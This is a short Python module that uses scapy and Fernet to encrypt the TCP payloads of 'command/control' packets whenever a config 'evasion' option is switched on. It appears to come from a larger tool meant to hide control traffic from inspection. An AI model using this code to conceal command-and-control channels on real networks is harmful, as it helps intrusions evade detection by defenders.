from cryptography.fernet import Fernet
import logging
from scapy.all import *

logger = logging.getLogger(__name__)

# Generate a key for demonstration. In real scenarios, manage this securely.
key = Fernet.generate_key()
cipher_suite = Fernet(key)

def encrypt_command_control(packet, config):
    """
    Encrypts the payload of command/control packets if encryption is enabled in config.
    """
    try:
        if config.get('evasion', {}).get('use_encryption', False):
            if packet.haslayer(TCP) and packet[TCP].payload:
                try:
                    # Encrypt only the payload
                    encrypted_payload = cipher_suite.encrypt(packet[TCP].payload.load)
                    new_packet = packet.copy()
                    new_packet[TCP].payload.load = encrypted_payload
                    return new_packet
                except Exception as e:
                    logger.error(f"Payload encryption failed: {e}")
        return packet
    except Exception as e:
        logger.error(f"Encryption error: {e}")
        return packet  # Return the original packet if encryption fails
